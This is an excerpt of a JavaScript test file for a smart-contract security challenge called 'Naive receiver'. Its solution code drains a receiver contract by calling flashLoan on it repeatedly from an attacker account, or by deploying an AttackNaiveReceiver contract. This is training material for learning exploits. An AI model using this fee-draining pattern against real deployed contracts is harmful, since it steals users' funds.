...
const AttackNaiveReceiver = contract.fromArtifact('AttackNaiveReceiver');
...
describe('[Challenge] Naive receiver', function () {
    ...
    //     for (let i = 0; i < 10; i++) {
    //         await this.pool.flashLoan(this.receiver.address, ether('1'), { from: attacker });
    //     }
    // });

    it('Exploit 2', async function () {
        await AttackNaiveReceiver.new(this.pool.address, this.receiver.address, { from: attacker });
    });
